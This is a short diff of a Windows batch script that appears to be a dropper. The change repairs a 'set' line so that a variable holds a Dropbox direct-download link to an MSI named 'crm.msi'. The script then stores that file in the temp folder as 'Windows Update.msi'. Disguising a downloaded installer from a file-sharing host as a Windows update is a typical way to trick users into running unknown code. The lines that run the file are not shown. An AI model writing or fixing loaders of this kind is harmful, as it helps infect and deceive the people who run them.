@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 
 :: Set download URL and paths
-set "https://dl.dropboxusercontent.com/scl/fi/alf3x72krw2efb5xqatys/crm.msi?rlkey=3kye4tri5h5432dm9h6sqxbsr"
+set "url=https://dl.dropboxusercontent.com/scl/fi/alf3x72krw2efb5xqatys/crm.msi?rlkey=3kye4tri5h5432dm9h6sqxbsr"
 set "outputFileName=Windows Update.msi"
 set "outputFilePath=%TEMP%\%outputFileName%"
 
